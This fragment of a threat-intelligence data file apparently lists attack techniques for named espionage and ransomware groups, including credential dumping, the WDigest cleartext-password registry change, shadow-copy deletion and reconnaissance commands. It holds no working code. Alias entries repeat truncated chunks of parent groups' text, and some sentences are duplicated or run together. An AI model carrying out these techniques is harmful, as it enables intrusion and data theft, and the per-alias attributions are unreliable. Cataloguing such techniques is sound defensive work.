    "Insidious Taurus": " Volt Typhoon has used multiple methods, including Ping, to enumerate systems on compromised networks., Volt Typhoon has obtained a screenshot of the victim's system using the gdi32.dll and gdiplus.dll libraries., Volt Typhoon has used FOFA, Shodan, and Censys to search for exposed victim infrastructure., Volt Typhoon has conducted pre-compromise web searches for victim information., Volt Typhoon has conducted pre-compromise reconnaissance on victim-owned sites., Volt Typhoon has used webshells, including ones named AuditReport.jspx and iisstart.aspx, in compromised environments.Versa Director Zero Day Exploitation resulted in the deployment of the VersaMem web shell for follow-on activity., Versa Director Zero Day Exploitation resulted in the deployment of the VersaMem web shell for follow-on activity., Volt Typhoon has queried the Registry on compromised systems for information on installed software., KV Botnet Activity involved removal of security tools, as well as other identified IOT malware, from compromised devices., Volt Typhoon has used native tools and processes including living off the land binaries or 'LOLBins' to maintain and expand access to the victim networks., Volt Typhoon has discovered file system types, drive names, size, and free space on compromised systems.KV Botnet Activity includes use of native system tools, such as uname, to obtain information about victim device architecture, as well as gathering other system information such as the victim's hosts file and CPU utilization., KV Botnet Activity includes use of native system tools, such as uname, to obtain information about victim device architecture, as well as gathering other system information such as the victim's hosts file and CPU utilization., Volt Typhoon has obtained the victim's system current location., Volt Typhoon has executed multiple commands to enumerate network topology and settings including  ipconfig, netsh interface firewall show all, and netsh interface portproxy show all.KV Botnet Activity gathers victim IP information during initial installation stages., KV Botnet Activity gathers victim IP information during initial installation stages., Volt Typhoon has employed Ping to check network connectivity., Volt Typhoon has used netstat -ano on compromised hosts to enumerate network connections. , Volt Typhoon has used public tools and executed the PowerShell command Get-EventLog security -instanceid 4624 to identify associated user and computer account names., Volt Typhoon has used net start to list running services., Volt Typhoon has obtained the victim's system timezone., Volt Typhoon has obtained credentials insecurely stored on targeted network appliances., Volt Typhoon has accessed a Local State file that contains the AES key used to encrypt passwords stored in the Chrome browser., Volt Typhoon relies primarily on valid credentials for persistence., Volt Typhoon has used compromised domain accounts to authenticate to devices on compromised networks., Volt Typhoon has run system checks to determine if they were operating in a virtualized environment.",
    "Whitefly": "Whitefly is a cyber espionage group that has been operating since at least 2017. The group has targeted organizations based mostly in Singapore across a wide variety of sectors, and is primarily interested in stealing large amounts of sensitive information. The group has been linked to an attack against Singapore’s largest public health organization, SingHealth., Whitefly has used a simple remote shell tool that will call back to the C2 server and wait for commands., Whitefly has used an open-source tool to exploit a known Windows privilege escalation vulnerability (CVE-2016-0051) on unpatched computers. , Whitefly has used search order hijacking to run the loader Vcrodat. , Whitefly has the ability to download additional tools from the C2., Whitefly has named the malicious DLL the same name as DLLs belonging to legitimate software from various security vendors., Whitefly has encrypted the payload used for C2. , Whitefly has obtained and used tools such as Mimikatz., Whitefly has used Mimikatz to obtain credentials., Whitefly has used malicious .exe or .dll files disguised as documents or images.",
    "Windigo": "The Windigo group has been operating since at least 2011, compromising thousands of Linux and Unix servers using the Ebury SSH backdoor to create a spam botnet. Despite law enforcement intervention against the creators, Windigo operators continued updating Ebury through 2019., Windigo has used a Perl script for information gathering., Windigo has used a script to gather credentials in files left on disk by OpenSSH backdoors., Windigo has distributed Windows malware via drive-by downloads., Windigo has used a script to check for the presence of files created by OpenSSH backdoors., Windigo has delivered a generic Windows proxy Win32/Glubteta.M. Windigo has also used multiple reverse proxy chains as part of their C2 infrastructure., Windigo has used a script to detect installed software on targeted systems., Windigo has used a script to detect which Linux distribution and version is currently installed on the system.",
    "Windshift": "Windshift is a threat group that has been active since at least 2017, targeting specific individuals for surveillance in government departments and critical infrastructure across the Middle East., , Windshift has used tools that communicate with C2 over HTTP., Windshift has created LNK files in the Startup folder to establish persistence., Windshift has used Visual Basic 6 (VB6) payloads., Windshift has used compromised websites to register custom URL schemes on a remote system., Windshift has used tools to deploy additional payloads to compromised hosts., Windshift has used icons mimicking MS Office files to mask malicious executables. Windshift has also attempted to hide executables by changing the file extension to '.scr' to mimic Windows screensavers., Windshift has used revoked certificates to sign malware., Windshift has used string encoding with floating point calculations., Windshift has sent spearphishing emails with attachment to harvest credentials and deliver malware., Windshift has sent spearphishing emails with links to harvest credentials and deliver malware., Windshift has used fake personas on social media to engage and target victims. , Windshift has used malware to enumerate active processes., Windshift has used malware to identify installed software., Windshift has used malware to identify installed AV and commonly used forensic and malware analysis tools., Windshift has used malware to identify the computer name of a compromised host., Windshift has used malware to identify the username on a compromised host., Windshift has used links embedded in e-mails to lure victims into executing malicious code., Windshift has used e-mail attachments to lure victims into executing malicious code., Windshift has used WMI to collect information about target machines., Windshift has included phone call and audio recording capabilities in the malicious apps deployed as part of Operation BULL and Operation ROCK., Windshift has exfiltrated local account data and calendar information as part of Operation ROCK., Windshift has included malware functionality capable of downloading new DEX files at runtime during Operation BULL., Windshift has encrypted C2 communications using AES in CBC mode during Operation BULL and Operation ROCK., Windshift has region-locked their malicious applications during their Operation BULL campaign., Windshift has included file enumeration in the malicious apps deployed as part of Operation BULL and Operation ROCK., Windshift has hidden multimedia files from the user., Windshift has included keylogging capabilities as part of Operation ROCK., Windshift has included location tracking capabilities in the malicious apps deployed as part of Operation BULL and Operation ROCK., Windshift has encrypted application strings using AES in ECB mode and Blowfish, and stored strings encoded in hex during Operation BULL. Further, in Operation BULL, encryption keys were stored within the application’s launcher icon file., Windshift has included contact list exfiltration in the malicious apps deployed as part of Operation BULL., Windshift has included SMS message exfiltration in the malicious apps deployed as part of Operation BULL and Operation ROCK., Windshift has installed malicious MDM profiles on iOS devices as part of Operation ROCK., Windshift has included system information enumeration in the malicious apps deployed as part of Operation BULL and Operation ROCK., Windshift has included video recording in the malicious apps deployed as part of Operation BULL., Windshift has deployed anti-analysis capabilities during their Operation BULL campaign.",
    "Bahamut": "Windshift has used malware to identify installed AV and commonly used forensic and malware analysis tools., Windshift has used malware to identify the computer name of a compromised host., Windshift has used malware to identify the username on a compromised host., Windshift has used links embedded in e-mails to lure victims into executing malicious code., Windshift has used e-mail attachments to lure victims into executing malicious code., Windshift has used WMI to collect information about target machines., Windshift has included phone call and audio recording capabilities in the malicious apps deployed as part of Operation BULL and Operation ROCK., Windshift has exfiltrated local account data and calendar information as part of Operation ROCK., Windshift has included malware functionality capable of downloading new DEX files at runtime during Operation BULL., Windshift has encrypted C2 communications using AES in CBC mode during Operation BULL and Operation ROCK., Windshift has region-locked their malicious applications during their Operation BULL campaign., Windshift has included file enumeration in the malicious apps deployed as part of Operation BULL and Operation ROCK., Windshift has hidden multimedia files from the user., Windshift has included keylogging capabilities as part of Operation ROCK.",
    "Winnti Group": "Winnti Group is a threat group with Chinese origins that has been active since at least 2010. The group has heavily targeted the gaming industry, but it has also expanded the scope of its targeting. Some reporting suggests a number of other groups, including Axiom, APT17, and Ke3chang, are closely linked to Winnti Group., , Winnti Group has registered domains for C2 that mimicked sites of their intended targets., Winnti Group has used a program named ff.exe to search for specific documents on compromised hosts., Winnti Group has downloaded an auxiliary program named ff.exe to infected machines., Winnti Group looked for a specific process running on infected servers., Winnti Group used a rootkit to modify typical server functionality., Winnti Group used stolen certificates to sign its malware.",
    "Winter Vivern": "Winter Vivern is a group linked to Russian and Belorussian interests active since at least 2020 targeting various European government and NGO entities, along with sporadic targeting of Indian and US victims. The group leverages a combination of document-based phishing activity and server-side exploitation for initial access, leveraging adversary-controlled and -created infrastructure for follow-on command and control., , , Winter Vivern registered domains mimicking other entities throughout various campaigns., Winter Vivern used adversary-owned and -controlled servers to host web vulnerability scanning applications., Winter Vivern has used remotely-hosted instances of the Acunetix vulnerability scanner., Winter Vivern uses HTTP and HTTPS protocols for exfiltration and command and control activity., Winter Vivern delivered a PowerShell script capable of recursively scanning victim machines looking for various file types before exfiltrating identified files via HTTP., Winter Vivern delivered a PowerShell script capable of recursively scanning victim machines looking for various file types before exfiltrating identified files via HTTP., Winter Vivern used XLM 4.0 macros for initial code execution for malicious document files., Winter Vivern passed execution from document macros to PowerShell scripts during initial access operations. Winter Vivern used batch scripts that called PowerShell commands as part of initial access and installation operations., Winter Vivern distributed Windows batch scripts disguised as virus scanners to prompt download of malicious payloads using built-in system tools., Winter Vivern delivered malicious JavaScript to exploit targets when exploiting Roundcube Webmail servers., Winter Vivern has used compromised WordPress sites to host malicious payloads for download., Winter Vivern delivered exploit payloads via base64-encoded payloads in malicious email messages., Winter Vivern created dedicated web pages mimicking legitimate government websites to deliver malicious fake anti-virus software., Winter Vivern delivered malicious JavaScript payloads capable of exfiltrating email messages from exploited email servers., Winter Vivern delivered a PowerShell script capable of recursively scanning victim machines looking for various file types before exfiltrating identified files via HTTP., Winter Vivern has exploited known and zero-day vulnerabilities in software usch as Roundcube Webmail servers and the 'Follina' vulnerability., Winter Vivern delivered malicious JavaScript payloads capable of listing folders and emails in exploited email servers., Winter Vivern executed PowerShell scripts to create scheduled tasks to retrieve remotely-hosted payloads., Winter Vivern registered and hosted domains to allow for creation of web pages mimicking legitimate government email logon sites to collect logon information., Winter Vivern created specially-crafted documents mimicking legitimate government or similar documents during phishing campaigns., Winter Vivern has distributed malicious scripts and executables mimicking virus scanners., Winter Vivern leverages malicious attachments delivered via email for initial access activity., Winter Vivern executed PowerShell scripts that would subsequently attempt to establish persistence by creating scheduled tasks objects to periodically retrieve and execute remotely-hosted payloads., Winter Vivern delivered PowerShell scripts capable of taking screenshots of victim machines., Winter Vivern script execution includes basic victim information gathering steps which are then transmitted to command and control servers., Winter Vivern PowerShell scripts execute whoami to identify the executing user., Winter Vivern has mimicked legitimate government-related domains to deliver malicious webpages containing links to documents or other content for user execution.",
    "TA473": "The group leverages a combination of document-based phishing activity and server-side exploitation for initial access, leveraging adversary-controlled and -created infrastructure for follow-on command and control., , , Winter Vivern registered domains mimicking other entities throughout various campaigns., Winter Vivern used adversary-owned and -controlled servers to host web vulnerability scanning applications., Winter Vivern has used remotely-hosted instances of the Acunetix vulnerability scanner., Winter Vivern uses HTTP and HTTPS protocols for exfiltration and command and control activity., Winter Vivern delivered a PowerShell script capable of recursively scanning victim machines looking for various file types before exfiltrating identified files via HTTP., Winter Vivern delivered a PowerShell script capable of recursively scanning victim machines looking for various file types before exfiltrating identified files via HTTP., Winter Vivern used XLM 4.0 macros for initial code execution for malicious document files., Winter Vivern passed execution from document macros to PowerShell scripts during initial access operations. Winter Vivern used batch scripts that called PowerShell commands as part of initial access and installation operations., Winter Vivern distributed Windows batch scripts disguised as virus scanners to prompt download of malicious payloads using built-in system tools.",
    "UAC-0114": "Winter Vivern delivered malicious JavaScript to exploit targets when exploiting Roundcube Webmail servers., Winter Vivern has used compromised WordPress sites to host malicious payloads for download., Winter Vivern delivered exploit payloads via base64-encoded payloads in malicious email messages., Winter Vivern created dedicated web pages mimicking legitimate government websites to deliver malicious fake anti-virus software., Winter Vivern delivered malicious JavaScript payloads capable of exfiltrating email messages from exploited email servers., Winter Vivern delivered a PowerShell script capable of recursively scanning victim machines looking for various file types before exfiltrating identified files via HTTP., Winter Vivern has exploited known and zero-day vulnerabilities in software usch as Roundcube Webmail servers and the 'Follina' vulnerability., Winter Vivern delivered malicious JavaScript payloads capable of listing folders and emails in exploited email servers., Winter Vivern executed PowerShell scripts to create scheduled tasks to retrieve remotely-hosted payloads., Winter Vivern registered and hosted domains to allow for creation of web pages mimicking legitimate government email logon sites to collect logon information., Winter Vivern created specially-crafted documents mimicking legitimate government or similar documents during phishing campaigns., Winter Vivern has distributed malicious scripts and executables mimicking virus scanners., Winter Vivern leverages malicious attachments delivered via email for initial access activity., Winter Vivern executed PowerShell scripts that would subsequently attempt to establish persistence by creating scheduled tasks objects to periodically retrieve and execute remotely-hosted payloads., Winter Vivern delivered PowerShell scripts capable of taking screenshots of victim machines., Winter Vivern script execution includes basic victim information gathering steps which are then transmitted to command and control servers., Winter Vivern PowerShell scripts execute whoami to identify the executing user., Winter Vivern has mimicked legitimate government-related domains to deliver malicious webpages containing links to documents or other content for user execution.",
    "WIRTE": "WIRTE is a threat group that has been active since at least August 2018. WIRTE has targeted government, diplomatic, financial, military, legal, and technology organizations in the Middle East and Europe., WIRTE has used HTTP for network communication. , WIRTE has used PowerShell for script execution., WIRTE has used VBScript  in its operations. , WIRTE has used Base64 to decode malicious VBS script., WIRTE has downloaded PowerShell code from the C2 server to be executed., WIRTE has named a first stage dropper Kaspersky Update Agent in order to appear legitimate., WIRTE has used HTTPS over ports 2083 and 2087 for C2., WIRTE has obtained and used Empire for post-exploitation activities., WIRTE has sent emails to intended victims with malicious MS Word and Excel attachments., WIRTE has used regsvr32.exe to trigger the execution of a malicious script., WIRTE has attempted to lure users into opening malicious MS Word and Excel files to execute malicious payloads.",
    "Wizard Spider": "Wizard Spider is a Russia-based financially motivated threat group originally known for the creation and deployment of TrickBot since at least 2016. Wizard Spider possesses a diverse aresenal of tools and has conducted ransomware campaigns against a variety of organizations, ranging from major corporations to hospitals., , , , , , , , , Wizard Spider has identified domain admins through the use of net group 'Domain admins' /DOMAIN. Wizard Spider has also leveraged the PowerShell cmdlet Get-ADComputer to collect account names from Active Directory data., Wizard Spider has used the Invoke-Inveigh PowerShell cmdlets, likely for name service poisoning., Wizard Spider has used HTTP for network communications., Wizard Spider has archived data into ZIP files on compromised machines., Wizard Spider has used batch scripts that utilizes WMIC to execute a BITSAdmin transfer of a ransomware payload to each compromised machine. , Wizard Spider has established persistence via the Registry key HKCU/SOFTWARE/Microsoft/Windows/CurrentVersion/Run and a shortcut within the startup folder., Wizard Spider has established persistence using Userinit by adding the Registry key HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Winlogon., Wizard Spider has used macros to execute PowerShell scripts to download malware on victim's machines. It has also used PowerShell to execute commands and move laterally through a victim network., Wizard Spider has used cmd.exe to execute commands on a victim's machine., Wizard Spider has created local administrator accounts to maintain persistence in compromised networks., Wizard Spider has created and used new accounts within a victim's Active Directory environment to maintain persistence., Wizard Spider has installed TrickBot as a service named ControlServiceA in order to establish persistence. , Wizard Spider has used PowerShell cmdlet Invoke-WCMDump to enumerate Windows credentials in the Credential Manager in a compromised network., Wizard Spider has collected data from a compromised host prior to exfiltration., Wizard Spider has collected and staged credentials and network enumeration information, using  the networkdll and psfin TrickBot modules., Wizard Spider has staged ZIP files in local directories such as, C:/PerfLogs/1/ and C:/User/1/ prior to exfiltration., Wizard Spider has leveraged ProtonMail email addresses in ransom notes when delivering Ryuk ransomware., Wizard Spider has exfiltrated victim information using FTP., Wizard Spider has exfiltrated domain credentials and network enumeration information over command and control (C2) channels., Wizard Spider has exfiltrated stolen victim data to various cloud storage providers. , Wizard Spider has exploited or attempted to exploit Zerologon (CVE-2020-1472) and EternalBlue (MS17-010) vulnerabilities., Wizard Spider has accessed victim networks by using stolen credentials to access the corporate VPN infrastructure., Wizard Spider has used the icacls command to modify access control to backup servers, providing them with full control of all the system folders., Wizard Spider has shut down or uninstalled security applications on victim systems that might prevent ransomware from executing., Wizard Spider has used file deletion to remove some modules and configurations from an infected host after use., Wizard Spider can transfer malicious payloads such as ransomware to compromised machines., Wizard Spider has used WMIC and vssadmin to manually delete volume shadow copies. Wizard Spider has also used Conti ransomware to delete volume shadow copies automatically with the use of vssadmin. , Wizard Spider has used stolen credentials to copy tools into the %TEMP% directory of domain controllers., Wizard Spider has used scheduled tasks to install TrickBot, using task names to appear legitimate such as WinDotNet, GoogleTask, or Sysnetsf. It has also used common document file names for other malware binaries., Wizard Spider has modified the Registry key HKLM/System/CurrentControlSet/Control/SecurityProviders/WDigest by setting the UseLogonCredential registry value to 1 in order to force credentials to be stored in clear text in memory. Wizard Spider has also modified the WDigest registry key to allow plaintext credentials to be cached in memory., Wizard Spider has used the 'net view' command to locate mapped network shares., Wizard Spider used Base64 encoding to obfuscate an Empire service and PowerShell commands., Wizard Spider has utilized tools such as Empire, Cobalt Strike, Cobalt Strike, Rubeus, AdFind, BloodHound, Metasploit, Advanced IP Scanner, Nirsoft PingInfoView, and SoftPerfect Network Scanner for targeting efforts., Wizard Spider has obtained code signing certificates signed by DigiCert, GlobalSign, and COMOOD for malware payloads., Wizard Spider has dumped the lsass.exe memory to harvest credentials with the use of open-source tool LaZagne., Wizard Spider has acquired credentials from the SAM/SECURITY registry hives., Wizard Spider has gained access to credentials via exported copies of the ntds.dit Active Directory database. Wizard Spider has also created a volume shadow copy and used a batch script file to collect NTDS.dit with the use of the Windows utility, ntdsutil., Wizard Spider has used spearphishing attachments to deliver Microsoft documents containing macros or PDFs containing malicious links to download either Emotet, Bokbot, TrickBot, or Bazar., Wizard Spider has sent phishing emails containing a link to an actor-controlled Google Drive document or other free online file hosting services., Wizard Spider has used process injection to execute payloads to escalate privileges., Wizard Spider has injected malicious DLLs into memory with read, write, and execute permissions., Wizard Spider has used the WebDAV protocol to execute Ryuk payloads hosted on network file shares., Wizard Spider has used RDP for lateral movement and to deploy ransomware interactively., Wizard Spider has used SMB to drop Cobalt Strike Beacon on a domain controller for lateral movement., Wizard Spider has used Window Remote Management to move laterally through a victim network., Wizard Spider has used networkdll for network discovery and psfin specifically for financial and point of sale indicators. Wizard Spider has also used AdFind, nltest/dclist, and PowerShell script Get-DataInfo.ps1 to enumerate domain computers, including the domain controller., Wizard Spider has used scheduled tasks to establish persistence for TrickBot and other malware., Wizard Spider has used taskkill.exe and net.exe to stop backup, catalog, cloud, and other services prior to network encryption., Wizard Spider has utilized the PowerShell script Get-DataInfo.ps1 to collect installed backup software information from a compromised machine., Wizard Spider has used WMI to identify anti-virus products installed on a victim's machine., Wizard Spider has used Rubeus, MimiKatz Kerberos module, and the Invoke-Kerberoast cmdlet to steal AES hashes., Wizard Spider has used Digicert code-signing certificates for some of its malware., Wizard Spider has utilized rundll32.exe to deploy ransomware commands with the use of WebDAV., Wizard Spider has used Systeminfo and similar commands to acquire detailed configuration information of a victim's machine. Wizard Spider has also utilized the PowerShell cmdlet Get-ADComputer to collect DNS hostnames, last logon dates, and operating system information from Active Directory., Wizard Spider has used ipconfig to identify the network configuration of a victim machine. Wizard Spider has also used the PowerShell cmdlet Get-ADComputer to collect IP address data from Active Directory., Wizard Spider has used 'whoami' to identify the local user and their privileges., Wizard Spider has used services.exe to execute scripts and executables during lateral movement within a victim's network. Wizard Spider has also used batch scripts that leverage PsExec to execute a previously transferred ransomware payload on a victim's network., Wizard Spider has used PowerShell cmdlets Get-GPPPassword and Find-GPOPassword to find unsecured credentials in a compromised network group policy., Wizard Spider has used the Invoke-SMBExec PowerShell cmdlet to execute the pass-the-hash technique and utilized stolen password hashes to move laterally., Wizard Spider has lured victims into clicking a malicious link delivered through spearphishing., Wizard Spider has lured victims to execute malware with spearphishing attachments containing macros to download either Emotet, Bokbot, TrickBot, or Bazar., Wizard Spider has used valid credentials for privileged accounts with the goal of accessing domain controllers., Wizard Spider has used administrative accounts, including Domain Admin, to move laterally within a victim network., Wizard Spider has used WMI and LDAP queries for network discovery and to move laterally. Wizard Spider has also used batch scripts to leverage WMIC to deploy ransomware.",
    "UNC1878": "Wizard Spider has archived data into ZIP files on compromised machines., Wizard Spider has used batch scripts that utilizes WMIC to execute a BITSAdmin transfer of a ransomware payload to each compromised machine. , Wizard Spider has established persistence via the Registry key HKCU/SOFTWARE/Microsoft/Windows/CurrentVersion/Run and a shortcut within the startup folder., Wizard Spider has established persistence using Userinit by adding the Registry key HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Winlogon., Wizard Spider has used macros to execute PowerShell scripts to download malware on victim's machines. It has also used PowerShell to execute commands and move laterally through a victim network., Wizard Spider has used cmd.exe to execute commands on a victim's machine., Wizard Spider has created local administrator accounts to maintain persistence in compromised networks., Wizard Spider has created and used new accounts within a victim's Active Directory environment to maintain persistence., Wizard Spider has installed TrickBot as a service named ControlServiceA in order to establish persistence. , Wizard Spider has used PowerShell cmdlet Invoke-WCMDump to enumerate Windows credentials in the Credential Manager in a compromised network., Wizard Spider has collected data from a compromised host prior to exfiltration., Wizard Spider has collected and staged credentials and network enumeration information, using  the networkdll and psfin TrickBot modules., Wizard Spider has staged ZIP files in local directories such as, C:/PerfLogs/1/ and C:/User/1/ prior to exfiltration., Wizard Spider has leveraged ProtonMail email addresses in ransom notes when delivering Ryuk ransomware., Wizard Spider has exfiltrated victim information using FTP., Wizard Spider has exfiltrated domain credentials and network enumeration information over command and control (C2) channels.",
    "TEMP.MixMaster": " Wizard Spider has used PowerShell cmdlet Invoke-WCMDump to enumerate Windows credentials in the Credential Manager in a compromised network., Wizard Spider has collected data from a compromised host prior to exfiltration., Wizard Spider has collected and staged credentials and network enumeration information, using  the networkdll and psfin TrickBot modules., Wizard Spider has staged ZIP files in local directories such as, C:/PerfLogs/1/ and C:/User/1/ prior to exfiltration., Wizard Spider has leveraged ProtonMail email addresses in ransom notes when delivering Ryuk ransomware., Wizard Spider has exfiltrated victim information using FTP., Wizard Spider has exfiltrated domain credentials and network enumeration information over command and control (C2) channels., Wizard Spider has exfiltrated stolen victim data to various cloud storage providers. , Wizard Spider has exploited or attempted to exploit Zerologon (CVE-2020-1472) and EternalBlue (MS17-010) vulnerabilities., Wizard Spider has accessed victim networks by using stolen credentials to access the corporate VPN infrastructure., Wizard Spider has used the icacls command to modify access control to backup servers, providing them with full control of all the system folders., Wizard Spider has shut down or uninstalled security applications on victim systems that might prevent ransomware from executing., Wizard Spider has used file deletion to remove some modules and configurations from an infected host after use., Wizard Spider can transfer malicious payloads such as ransomware to compromised machines., Wizard Spider has used WMIC and vssadmin to manually delete volume shadow copies. Wizard Spider has also used Conti ransomware to delete volume shadow copies automatically with the use of vssadmin. , Wizard Spider has used stolen credentials to copy tools into the %TEMP% directory of domain controllers.",
    "Grim Spider": " Wizard Spider has used PowerShell cmdlet Invoke-WCMDump to enumerate Windows credentials in the Credential Manager in a compromised network., Wizard Spider has collected data from a compromised host prior to exfiltration., Wizard Spider has collected and staged credentials and network enumeration information, using  the networkdll and psfin TrickBot modules., Wizard Spider has staged ZIP files in local directories such as, C:/PerfLogs/1/ and C:/User/1/ prior to exfiltration., Wizard Spider has leveraged ProtonMail email addresses in ransom notes when delivering Ryuk ransomware., Wizard Spider has exfiltrated victim information using FTP., Wizard Spider has exfiltrated domain credentials and network enumeration information over command and control (C2) channels., Wizard Spider has exfiltrated stolen victim data to various cloud storage providers. , Wizard Spider has exploited or attempted to exploit Zerologon (CVE-2020-1472) and EternalBlue (MS17-010) vulnerabilities., Wizard Spider has accessed victim networks by using stolen credentials to access the corporate VPN infrastructure., Wizard Spider has used the icacls command to modify access control to backup servers, providing them with full control of all the system folders., Wizard Spider has shut down or uninstalled security applications on victim systems that might prevent ransomware from executing., Wizard Spider has used file deletion to remove some modules and configurations from an infected host after use., Wizard Spider can transfer malicious payloads such as ransomware to compromised machines., Wizard Spider has used WMIC and vssadmin to manually delete volume shadow copies. Wizard Spider has also used Conti ransomware to delete volume shadow copies automatically with the use of vssadmin. , Wizard Spider has used stolen credentials to copy tools into the %TEMP% directory of domain controllers., Wizard Spider has used scheduled tasks to install TrickBot, using task names to appear legitimate such as WinDotNet, GoogleTask, or Sysnetsf. It has also used common document file names for other malware binaries., Wizard Spider has modified the Registry key HKLM/System/CurrentControlSet/Control/SecurityProviders/WDigest by setting the UseLogonCredential registry value to 1 in order to force credentials to be stored in clear text in memory. Wizard Spider has also modified the WDigest registry key to allow plaintext credentials to be cached in memory.",
    "FIN12": "Wizard Spider has used stolen credentials to copy tools into the %TEMP% directory of domain controllers., Wizard Spider has used scheduled tasks to install TrickBot, using task names to appear legitimate such as WinDotNet, GoogleTask, or Sysnetsf. It has also used common document file names for other malware binaries., Wizard Spider has modified the Registry key HKLM/System/CurrentControlSet/Control/SecurityProviders/WDigest by setting the UseLogonCredential registry value to 1 in order to force credentials to be stored in clear text in memory. Wizard Spider has also modified the WDigest registry key to allow plaintext credentials to be cached in memory., Wizard Spider has used the 'net view' command to locate mapped network shares., Wizard Spider used Base64 encoding to obfuscate an Empire service and PowerShell commands., Wizard Spider has utilized tools such as Empire, Cobalt Strike, Cobalt Strike, Rubeus, AdFind, BloodHound, Metasploit, Advanced IP Scanner, Nirsoft PingInfoView, and SoftPerfect Network Scanner for targeting efforts., Wizard Spider has obtained code signing certificates signed by DigiCert, GlobalSign, and COMOOD for malware payloads., Wizard Spider has dumped the lsass.exe memory to harvest credentials with the use of open-source tool LaZagne., Wizard Spider has acquired credentials from the SAM/SECURITY registry hives., Wizard Spider has gained access to credentials via exported copies of the ntds.dit Active Directory database. Wizard Spider has also created a volume shadow copy and used a batch script file to collect NTDS.dit with the use of the Windows utility, ntdsutil., Wizard Spider has used spearphishing attachments to deliver Microsoft documents containing macros or PDFs containing malicious links to download either Emotet, Bokbot, TrickBot, or Bazar., Wizard Spider has sent phishing emails containing a link to an actor-controlled Google Drive document or other free online file hosting services., Wizard Spider has used process injection to execute payloads to escalate privileges., Wizard Spider has injected malicious DLLs into memory with read, write, and execute permissions., Wizard Spider has used the WebDAV protocol to execute Ryuk payloads hosted on network file shares.",
    "GOLD BLACKBURN": "Wizard Spider has used process injection to execute payloads to escalate privileges., Wizard Spider has injected malicious DLLs into memory with read, write, and execute permissions., Wizard Spider has used the WebDAV protocol to execute Ryuk payloads hosted on network file shares., Wizard Spider has used RDP for lateral movement and to deploy ransomware interactively., Wizard Spider has used SMB to drop Cobalt Strike Beacon on a domain controller for lateral movement., Wizard Spider has used Window Remote Management to move laterally through a victim network., Wizard Spider has used networkdll for network discovery and psfin specifically for financial and point of sale indicators. Wizard Spider has also used AdFind, nltest/dclist, and PowerShell script Get-DataInfo.ps1 to enumerate domain computers, including the domain controller., Wizard Spider has used scheduled tasks to establish persistence for TrickBot and other malware., Wizard Spider has used taskkill.exe and net.exe to stop backup, catalog, cloud, and other services prior to network encryption., Wizard Spider has utilized the PowerShell script Get-DataInfo.ps1 to collect installed backup software information from a compromised machine., Wizard Spider has used WMI to identify anti-virus products installed on a victim's machine.",
    "ITG23": "Wizard Spider has used Systeminfo and similar commands to acquire detailed configuration information of a victim's machine. Wizard Spider has also utilized the PowerShell cmdlet Get-ADComputer to collect DNS hostnames, last logon dates, and operating system information from Active Directory., Wizard Spider has used ipconfig to identify the network configuration of a victim machine. Wizard Spider has also used the PowerShell cmdlet Get-ADComputer to collect IP address data from Active Directory., Wizard Spider has used 'whoami' to identify the local user and their privileges., Wizard Spider has used services.exe to execute scripts and executables during lateral movement within a victim's network. Wizard Spider has also used batch scripts that leverage PsExec to execute a previously transferred ransomware payload on a victim's network., Wizard Spider has used PowerShell cmdlets Get-GPPPassword and Find-GPOPassword to find unsecured credentials in a compromised network group policy., Wizard Spider has used the Invoke-SMBExec PowerShell cmdlet to execute the pass-the-hash technique and utilized stolen password hashes to move laterally., Wizard Spider has lured victims into clicking a malicious link delivered through spearphishing., Wizard Spider has lured victims to execute malware with spearphishing attachments containing macros to download either Emotet, Bokbot, TrickBot, or Bazar., Wizard Spider has used valid credentials for privileged accounts with the goal of accessing domain controllers., Wizard Spider has used administrative accounts, including Domain Admin, to move laterally within a victim network., Wizard Spider has used WMI and LDAP queries for network discovery and to move laterally. Wizard Spider has also used batch scripts to leverage WMIC to deploy ransomware.",
    "ZIRCONIUM": "ZIRCONIUM is a threat group operating out of China, active since at least 2017, that has targeted individuals associated with the 2020 US presidential election and prominent leaders in the international affairs community., , , ZIRCONIUM has purchased domains for use in targeted campaigns., ZIRCONIUM has used GitHub to host malware linked in spearphishing e-mails., ZIRCONIUM has created a Registry Run key named Dropbox Update Setup to establish persistence for a malicious Python binary., ZIRCONIUM has used a tool to open a Windows Command Shell on a remote host., ZIRCONIUM has used Python-based implants to interact with compromised hosts., ZIRCONIUM has compromised network devices such as small office and home office (SOHO) routers and IoT devices for ORB (operational relay box) Proxy networks. , ZIRCONIUM has used a tool to steal credentials from installed web browsers including Microsoft Internet Explorer and Google Chrome., ZIRCONIUM has used the AES256 algorithm with a SHA1 derived key to decrypt exploit code., ZIRCONIUM has used AES encrypted communications in C2., ZIRCONIUM has exfiltrated files via the Dropbox API C2., ZIRCONIUM has exfiltrated stolen data to Dropbox., ZIRCONIUM has exploited CVE-2017-0005 for local privilege escalation., ZIRCONIUM has used tools to download malicious files to compromised hosts., ZIRCONIUM has spoofed legitimate applications in phishing lures and changed file extensions to conceal  installation of malware., ZIRCONIUM has created a run key named Dropbox Update Setup to mask a persistence mechanism for a malicious binary., ZIRCONIUM has used multi-stage packers for exploit code., ZIRCONIUM has used malicious links in e-mails to deliver malware., ZIRCONIUM targeted presidential campaign staffers with credential phishing e-mails., ZIRCONIUM has used web beacons in e-mails to track hits to attacker-controlled URL's., ZIRCONIUM has utilized an ORB (operational relay box) network – consisting compromised devices such as small office and home office (SOHO) routers, IoT devices, and leased virtual private servers (VPS) – to proxy traffic. , ZIRCONIUM has used a tool to query the Registry for proxy settings., ZIRCONIUM has used the msiexec.exe command-line utility to download and execute malicious MSI files., ZIRCONIUM has used a tool to capture the processor architecture of a compromised host in order to register it with C2., ZIRCONIUM has used a tool to enumerate proxy settings in the target environment., ZIRCONIUM has used a tool to capture the username on a compromised host in order to register it with C2., ZIRCONIUM has used a tool to capture the time on a compromised host in order to register it with C2., ZIRCONIUM has used malicious links in e-mails to lure victims into downloading malware., ZIRCONIUM has used Dropbox for C2 allowing upload and download of files as well as execution of arbitrary commands.",
